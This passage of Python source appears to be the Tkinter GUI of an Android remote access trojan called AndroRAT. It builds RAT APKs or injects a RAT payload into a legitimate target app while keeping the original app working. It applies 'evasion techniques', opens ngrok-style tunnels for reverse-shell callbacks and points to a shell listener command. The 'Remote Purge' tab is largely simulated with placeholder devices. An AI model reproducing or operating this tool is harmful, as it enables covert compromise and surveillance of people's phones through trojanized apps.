        self.log_text.insert(tk.END, log_message)
        self.log_text.see(tk.END)
        
        # Add to queue for status bar
        self.message_queue.put(("status", message))
        
    def clear_log(self):
        """Clear the log display"""
        self.log_text.delete(1.0, tk.END)
        self.add_log("Log cleared")
        
    def save_logs(self):
        """Save logs to file"""
        filename = filedialog.asksaveasfilename(
            title="Save logs as...",
            defaultextension=".txt",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        if filename:
            try:
                with open(filename, 'w') as f:
                    f.write(self.log_text.get(1.0, tk.END))
                self.add_log(f"Logs saved to {filename}")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to save logs: {str(e)}")
                
    def validate_build_inputs(self):
        """Validate inputs for APK building"""
        # Check injection mode specific validation
        if self.inject_var.get():
            if not self.target_apk_var.get():
                messagebox.showerror("Error", "Target APK file is required for injection mode")
                return False
            if not os.path.exists(self.target_apk_var.get()):
                messagebox.showerror("Error", "Target APK file does not exist")
                return False
            if not self.target_apk_var.get().lower().endswith('.apk'):
                messagebox.showerror("Error", "Target file must be an APK")
                return False
        
        # Check if either tunneling or manual IP is specified (not needed for injection with manual IP)
        using_tunnel = self.ngrok_var.get() or self.tunnel_var.get()
        
        if not using_tunnel:
            if not self.ip_var.get() or self.ip_var.get().startswith("(auto-configured"):
                messagebox.showerror("Error", "IP address is required when not using tunneling")
                return False
            if not is_valid_ip(self.ip_var.get()):
                messagebox.showerror("Error", "Invalid IP address format")
                return False
                
        if not self.port_var.get():
            messagebox.showerror("Error", "Port is required")
            return False
            
        if not is_valid_port(self.port_var.get()):
            messagebox.showerror("Error", "Invalid port number (1-65535)")
            return False
            
        if not self.output_var.get():
            messagebox.showerror("Error", "Output filename is required")
            return False
            
        # Validate filename
        if not is_valid_filename(self.output_var.get()):
            # Auto-add .apk extension if missing
            filename = self.output_var.get()
            if not filename.lower().endswith('.apk'):
                filename += '.apk'
                self.output_var.set(filename)
            
            # Re-validate
            if not is_valid_filename(filename):
                messagebox.showerror("Error", "Invalid filename format")
                return False
            
        return True
        
    def start_build(self):
        """Start the APK building process"""
        if not self.validate_build_inputs():
            return
            
        # Disable build button and start progress
        self.build_button.config(state='disabled')
        self.progress_bar.start()
        
        # Start build in separate thread
        build_thread = threading.Thread(target=self.build_apk_thread)
        build_thread.daemon = True
        build_thread.start()
        
    def build_apk_thread(self):
        """APK building thread"""
        try:
            self.message_queue.put(("log", "Starting APK build process..."))
            
            # Prepare arguments
            ip = self.ip_var.get() if not (self.ngrok_var.get() or self.tunnel_var.get()) else None
            port = int(self.port_var.get())
            output = self.output_var.get()
            icon = self.icon_var.get()
            use_tunneling = self.ngrok_var.get() or self.tunnel_var.get()
            
            tunnel_manager = None
            final_ip = ip
            final_port = port
            
            # Handle tunneling
            if use_tunneling:
                self.message_queue.put(("log", "Setting up tunnel..."))
                
                try:
                    # Import tunneling module
                    from tunneling import create_tunnel_with_alternatives
                    
                    # Determine service preference
                    if self.ngrok_var.get():
                        service = "ngrok"
                    else:
                        service = self.tunnel_service_var.get()
                    
                    self.message_queue.put(("log", f"Trying {service} tunneling service..."))
                    
                    # Create tunnel
                    tunnel_manager, tunnel_result = create_tunnel_with_alternatives(port, service)
                    
                    if tunnel_result:
                        final_ip, final_port, tunnel_url = tunnel_result
                        self.message_queue.put(("log", f"Tunnel established: {final_ip}:{final_port}"))
                        self.message_queue.put(("log", f"Tunnel URL: {tunnel_url}"))
                    else:
                        self.message_queue.put(("error", "Failed to establish tunnel"))
                        return
                        
                except Exception as e:
                    self.message_queue.put(("error", f"Tunnel setup failed: {str(e)}"))
                    return
                    
            self.message_queue.put(("log", f"Building APK with IP: {final_ip}, Port: {final_port}"))
            
            # Get evasion options
            evasion_options = self.get_evasion_options()
            
            # Check if any evasion options are enabled
            has_evasion = any(evasion_options.values())
            if has_evasion:
                self.message_queue.put(("log", "Applying advanced evasion techniques..."))
                evasion_list = [k for k, v in evasion_options.items() if v]
                self.message_queue.put(("log", f"Active evasions: {', '.join(evasion_list)}"))
            
            # Check if using injection mode
            if self.inject_var.get():
                self.message_queue.put(("log", "APK injection mode enabled"))
                self.message_queue.put(("log", f"Target APK: {self.target_apk_var.get()}"))
                
                # Use injection function
                from utils import inject_rat_into_apk
                success = inject_rat_into_apk(
                    self.target_apk_var.get(),
                    final_ip,
                    str(final_port),
                    output,
                    evasion_options
                )
                
                if success:
                    self.message_queue.put(("success", f"APK injection completed: {output}"))
                    self.message_queue.put(("log", "Original app functionality preserved with RAT payload"))
                else:
                    self.message_queue.put(("error", "APK injection failed"))
                    return
            else:
                # Use standard build with evasion if enabled
                if has_evasion:
                    from utils import build_with_evasion
                    build_with_evasion(final_ip, str(final_port), output, use_tunneling, 
                                     str(port) if use_tunneling else None, icon, evasion_options)
                else:
                    # Standard build
                    build(final_ip, str(final_port), output, use_tunneling, 
                          str(port) if use_tunneling else None, icon)
                
                self.message_queue.put(("success", f"APK built successfully: {output}"))
            
            # If tunneling was used, optionally keep tunnel alive
            if tunnel_manager:
                self.message_queue.put(("log", "Tunnel will remain active for shell connections"))
                
        except Exception as e:
            self.message_queue.put(("error", f"Build failed: {str(e)}"))
        finally:
            self.message_queue.put(("build_done", None))
            if tunnel_manager:
                # Close tunnel after build
                tunnel_manager.close_tunnel()
            
    def start_shell(self):
        """Start shell listener"""
        ip = self.shell_ip_var.get()
        port = self.shell_port_var.get()
        
        if not ip or not port:
            messagebox.showerror("Error", "IP and port are required")
            return
            
        if not is_valid_port(port):
            messagebox.showerror("Error", "Invalid port number")
            return
            
        # For now, show info dialog about using CLI
        messagebox.showinfo("Shell Listener", 
                           f"To start shell listener on {ip}:{port}, use CLI mode:\n\n"
                           f"python3 androRAT.py --shell -i {ip} -p {port}")
        
    def process_queue(self):
        """Process messages from worker threads"""
        try:
            while True:
                msg_type, msg_data = self.message_queue.get_nowait()
                
                if msg_type == "log":
                    self.add_log(msg_data)
                elif msg_type == "error":
                    self.add_log(msg_data, "ERROR")
                elif msg_type == "success":
                    self.add_log(msg_data, "SUCCESS")
                elif msg_type == "status":
                    self.status_var.set(f"🔄 {msg_data}")
                elif msg_type == "build_done":
                    self.build_button.config(state='normal')
                    self.progress_bar.stop()
                elif msg_type == "purge_done":
                    self.purge_button.config(state='normal')
                    
        except queue.Empty:
            pass
            
        # Schedule next check
        self.root.after(100, self.process_queue)
        
    def create_purge_tab(self):
        """Create the remote backdoor purge tab"""
        purge_frame = ttk.Frame(self.notebook, style='Modern.TFrame')
        self.notebook.add(purge_frame, text="🗑️ Remote Purge")
        
        # Modern header
        header_frame = tk.Frame(purge_frame, bg=self.colors['danger'], height=80)
        header_frame.pack(fill=tk.X, padx=0, pady=0)
        header_frame.pack_propagate(False)
        
        title_label = tk.Label(header_frame, text="🗑️ Remote Backdoor Purge", 
                              bg=self.colors['danger'], fg='white',
                              font=('Segoe UI', 20, 'bold'))
        title_label.pack(pady=(15, 5))
        
        subtitle_label = tk.Label(header_frame, 
                                 text="Safely remove backdoor from infected devices while preserving app functionality",
                                 bg=self.colors['danger'], fg='white',
                                 font=('Segoe UI', 11))
        subtitle_label.pack()
        
        # Content frame with modern styling
        content_frame = tk.Frame(purge_frame, bg=self.colors['bg_primary'])
        content_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
        
        # Connection status card
        status_card = tk.Frame(content_frame, bg=self.colors['bg_secondary'], 
                              relief='raised', borderwidth=1)
        status_card.pack(fill=tk.X, pady=(0, 15))
        
        status_header = tk.Frame(status_card, bg=self.colors['accent'], height=35)
        status_header.pack(fill=tk.X)
        status_header.pack_propagate(False)
        
        tk.Label(status_header, text="📡 Connection Status", 
                bg=self.colors['accent'], fg='white',
                font=('Segoe UI', 11, 'bold')).pack(pady=10)
        
        status_content = tk.Frame(status_card, bg=self.colors['bg_secondary'])
        status_content.pack(fill=tk.X, padx=20, pady=15)
        
        # Connected devices list
        tk.Label(status_content, text="Connected Devices:", 
                bg=self.colors['bg_secondary'], fg=self.colors['text_primary'],
                font=('Segoe UI', 10, 'bold')).pack(anchor=tk.W)
        
        # Device listbox with modern styling
        device_frame = tk.Frame(status_content, bg=self.colors['bg_secondary'])
        device_frame.pack(fill=tk.X, pady=(5, 0))
        
        self.device_listbox = tk.Listbox(device_frame, height=4,
                                        bg=self.colors['bg_tertiary'], fg=self.colors['text_primary'],
                                        font=('Segoe UI', 10), relief='flat', borderwidth=1,
                                        selectbackground=self.colors['accent'])
        self.device_listbox.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        device_scrollbar = ttk.Scrollbar(device_frame, orient="vertical", command=self.device_listbox.yview)
        device_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.device_listbox.configure(yscrollcommand=device_scrollbar.set)
        
        # Add sample device for demo
        self.device_listbox.insert(tk.END, "📱 No devices connected")
        
        # Refresh button
        refresh_btn = tk.Button(status_content, text="🔄 Refresh Devices", 
                               command=self.refresh_devices,
                               bg=self.colors['accent'], fg='white',
                               font=('Segoe UI', 10), relief='flat',
                               activebackground=self.colors['accent_hover'])
        refresh_btn.pack(anchor=tk.W, pady=(10, 0))
        
        # Purge operations card
        purge_card = tk.Frame(content_frame, bg=self.colors['bg_secondary'], 
                             relief='raised', borderwidth=1)
        purge_card.pack(fill=tk.X, pady=(0, 15))
        
        purge_header = tk.Frame(purge_card, bg=self.colors['warning'], height=35)
        purge_header.pack(fill=tk.X)
        purge_header.pack_propagate(False)
        
        tk.Label(purge_header, text="⚠️ Purge Operations", 
                bg=self.colors['warning'], fg='black',
                font=('Segoe UI', 11, 'bold')).pack(pady=10)
        
        purge_content = tk.Frame(purge_card, bg=self.colors['bg_secondary'])
        purge_content.pack(fill=tk.X, padx=20, pady=15)
        
        # Purge options with modern checkboxes
        self.purge_files_var = tk.BooleanVar(value=True)
        self.purge_services_var = tk.BooleanVar(value=True)
        self.purge_receivers_var = tk.BooleanVar(value=True)
        self.purge_permissions_var = tk.BooleanVar(value=False)
        
        purge_options = [
            ("🗂️ Remove backdoor files and payload", self.purge_files_var, "Delete all RAT-related files"),
            ("⚙️ Stop and remove background services", self.purge_services_var, "Terminate all backdoor services"),
            ("📡 Unregister broadcast receivers", self.purge_receivers_var, "Remove event listeners"),
            ("🔒 Revoke unnecessary permissions (experimental)", self.purge_permissions_var, "May affect app functionality")
        ]
        
        for text, var, tooltip in purge_options:
            option_frame = tk.Frame(purge_content, bg=self.colors['bg_tertiary'], relief='solid', borderwidth=1)
            option_frame.pack(fill=tk.X, pady=3)
            
            check = tk.Checkbutton(option_frame, text=text, variable=var,
                                  bg=self.colors['bg_tertiary'], fg=self.colors['text_primary'],
                                  font=('Segoe UI', 10), selectcolor=self.colors['bg_secondary'],
                                  activebackground=self.colors['bg_tertiary'])
            check.pack(anchor=tk.W, padx=10, pady=8)
            
            tip_label = tk.Label(option_frame, text=f"💡 {tooltip}",
                               bg=self.colors['bg_tertiary'], fg=self.colors['text_secondary'],
                               font=('Segoe UI', 8))
            tip_label.pack(anchor=tk.W, padx=25, pady=(0, 8))
        
        # Authentication frame
        auth_frame = tk.Frame(purge_content, bg=self.colors['bg_tertiary'], relief='solid', borderwidth=1)
        auth_frame.pack(fill=tk.X, pady=(15, 0))
        
        tk.Label(auth_frame, text="🔐 Purge Authentication", 
                bg=self.colors['bg_tertiary'], fg=self.colors['text_primary'],
                font=('Segoe UI', 11, 'bold')).pack(pady=(10, 5))
        
        auth_controls = tk.Frame(auth_frame, bg=self.colors['bg_tertiary'])
        auth_controls.pack(fill=tk.X, padx=15, pady=(0, 10))
        
        tk.Label(auth_controls, text="Purge Key:", 
                bg=self.colors['bg_tertiary'], fg=self.colors['text_secondary'],
                font=('Segoe UI', 10)).pack(side=tk.LEFT)
        
        self.purge_key_var = tk.StringVar()
        self.purge_key_entry = tk.Entry(auth_controls, textvariable=self.purge_key_var, 
                                       width=30, show="*",
                                       bg=self.colors['bg_secondary'], fg=self.colors['text_primary'],
                                       font=('Segoe UI', 10), relief='flat', borderwidth=2)
        self.purge_key_entry.pack(side=tk.LEFT, padx=(10, 10))
        
        gen_key_btn = tk.Button(auth_controls, text="🔑 Generate", 
                               command=self.generate_purge_key,
                               bg=self.colors['accent'], fg='white',
                               font=('Segoe UI', 9), relief='flat',
                               activebackground=self.colors['accent_hover'])
        gen_key_btn.pack(side=tk.LEFT)
        
        # Action buttons card
        action_card = tk.Frame(content_frame, bg=self.colors['bg_secondary'], 
                              relief='raised', borderwidth=1)
        action_card.pack(fill=tk.X)
        
        action_header = tk.Frame(action_card, bg=self.colors['danger'], height=35)
        action_header.pack(fill=tk.X)
        action_header.pack_propagate(False)
        
        tk.Label(action_header, text="🚨 Danger Zone", 
                bg=self.colors['danger'], fg='white',
                font=('Segoe UI', 11, 'bold')).pack(pady=10)
        
        action_content = tk.Frame(action_card, bg=self.colors['bg_secondary'])
        action_content.pack(fill=tk.X, padx=20, pady=15)
        
        # Warning text
        warning_text = ("⚠️  WARNING: Purge operations are irreversible!\n"
                       "✅ This will safely remove the backdoor while preserving app functionality\n"
                       "🔒 Requires valid authentication key for security")
        
        warning_label = tk.Label(action_content, text=warning_text,
                                bg=self.colors['bg_secondary'], fg=self.colors['warning'],
                                font=('Segoe UI', 9, 'bold'), justify=tk.LEFT)
        warning_label.pack(anchor=tk.W, pady=(0, 15))
        
        # Action buttons
        button_frame = tk.Frame(action_content, bg=self.colors['bg_secondary'])
        button_frame.pack(fill=tk.X)
        
        # Test connection button
        test_btn = tk.Button(button_frame, text="🔍 Test Connection", 
                            command=self.test_purge_connection,
                            bg=self.colors['accent'], fg='white',
                            font=('Segoe UI', 10), relief='flat',
                            activebackground=self.colors['accent_hover'])
        test_btn.pack(side=tk.LEFT, padx=(0, 15))
        
        # Execute purge button
        self.purge_button = tk.Button(button_frame, text="🗑️ Execute Purge", 
                                     command=self.execute_purge,
                                     bg=self.colors['danger'], fg='white',
                                     font=('Segoe UI', 10, 'bold'), relief='flat',
                                     activebackground='#c82333')
        self.purge_button.pack(side=tk.LEFT, padx=(0, 15))
        
        # Emergency stop button
        stop_btn = tk.Button(button_frame, text="🛑 Emergency Stop", 
                            command=self.emergency_stop,
                            bg='#6c757d', fg='white',
                            font=('Segoe UI', 10), relief='flat',
                            activebackground='#5a6268')
        stop_btn.pack(side=tk.LEFT)
        
    def refresh_devices(self):
        """Refresh the list of connected devices"""
        self.device_listbox.delete(0, tk.END)
        # TODO: Implement actual device discovery
        self.device_listbox.insert(tk.END, "📱 Scanning for devices...")
        self.add_log("Refreshing device list...")
        
        # Simulate device discovery
        self.root.after(2000, self._update_device_list)
        
    def _update_device_list(self):
        """Update device list after scan"""
        self.device_listbox.delete(0, tk.END)
        # TODO: Replace with actual connected devices
        sample_devices = [
            "📱 Samsung Galaxy S21 - 192.168.1.100:8080",
            "📱 Pixel 6 Pro - 192.168.1.101:8080"
        ]
        
        if not sample_devices:
            self.device_listbox.insert(tk.END, "📱 No devices connected")
        else:
            for device in sample_devices:
                self.device_listbox.insert(tk.END, device)
        
        self.add_log(f"Found {len(sample_devices)} connected devices")
        
    def generate_purge_key(self):
        """Generate a secure purge authentication key"""
        import secrets
        import string
        
        # Generate a secure random key
        alphabet = string.ascii_letters + string.digits
        key = ''.join(secrets.choice(alphabet) for _ in range(32))
        self.purge_key_var.set(key)
        self.add_log("Secure purge key generated")
        
    def test_purge_connection(self):
        """Test connection to selected device for purge operation"""
        selection = self.device_listbox.curselection()
        if not selection:
            messagebox.showwarning("Warning", "Please select a device first")
            return
            
        device = self.device_listbox.get(selection[0])
        if "No devices connected" in device:
            messagebox.showwarning("Warning", "No devices available for testing")
            return
            
        self.add_log(f"Testing purge connection to: {device}")
        
        # TODO: Implement actual connection test
        # For now, simulate a test
        self.root.after(1500, lambda: self.add_log("✅ Purge connection test successful"))
        
    def execute_purge(self):
        """Execute the remote backdoor purge operation"""
        selection = self.device_listbox.curselection()
        if not selection:
            messagebox.showwarning("Warning", "Please select a device first")
            return
            
        device = self.device_listbox.get(selection[0])
        if "No devices connected" in device:
            messagebox.showwarning("Warning", "No devices available for purging")
            return
            
        if not self.purge_key_var.get():
            messagebox.showerror("Error", "Purge authentication key is required")
            return
            
        # Confirmation dialog with modern styling
        result = messagebox.askyesno(
            "Confirm Purge Operation",
            f"Are you sure you want to purge the backdoor from:\n{device}\n\n"
            "This action is irreversible and will:\n"
            "• Remove all backdoor components\n"
            "• Preserve original app functionality\n"
            "• Require device reconnection if successful\n\n"
            "Continue with purge operation?"
        )
        
        if result:
            self._start_purge_process(device)
            
    def _start_purge_process(self, device):
        """Start the purge process in a separate thread"""
        self.purge_button.config(state='disabled')
        self.add_log(f"🗑️ Starting purge operation on: {device}")
        
        # Start purge in background thread
        purge_thread = threading.Thread(target=self._purge_worker, args=(device,))
        purge_thread.daemon = True
        purge_thread.start()
        
    def _purge_worker(self, device):
        """Worker thread for purge operation"""
        try:
            import time
            self.message_queue.put(("log", "Authenticating purge request..."))
            time.sleep(1)
            
            if self.purge_files_var.get():
                self.message_queue.put(("log", "🗂️ Removing backdoor files..."))
                time.sleep(2)
                
            if self.purge_services_var.get():
                self.message_queue.put(("log", "⚙️ Stopping background services..."))
                time.sleep(1.5)
                
            if self.purge_receivers_var.get():
                self.message_queue.put(("log", "📡 Unregistering broadcast receivers..."))
                time.sleep(1)
                
            if self.purge_permissions_var.get():
                self.message_queue.put(("log", "🔒 Revoking unnecessary permissions..."))
                time.sleep(1)
                
            # TODO: Implement actual purge commands to device
            self.message_queue.put(("success", "✅ Purge operation completed successfully!"))
            self.message_queue.put(("log", "Device should now be clean of backdoor components"))
            self.message_queue.put(("log", "Original app functionality preserved"))
            
        except Exception as e:
            self.message_queue.put(("error", f"Purge operation failed: {str(e)}"))
        finally:
            self.message_queue.put(("purge_done", None))
            
    def emergency_stop(self):
        """Emergency stop for all operations"""
        self.add_log("🛑 Emergency stop activated - halting all operations")
        self.purge_button.config(state='normal')
        messagebox.showinfo("Emergency Stop", "All operations have been halted")

def main():
    """Main function to run the GUI"""
    # Check Python version
    if sys.version_info < (3, 6):
        print("Error: Python version should be 3.6 or higher")
        sys.exit(1)
        
    # Create and run GUI
    root = tk.Tk()
    app = AndroRATGUI(root)
    
    try:
        root.mainloop()
    except KeyboardInterrupt:
        print("\nGUI closed by user")
        sys.exit(0)

if __name__ == "__main__":
    main()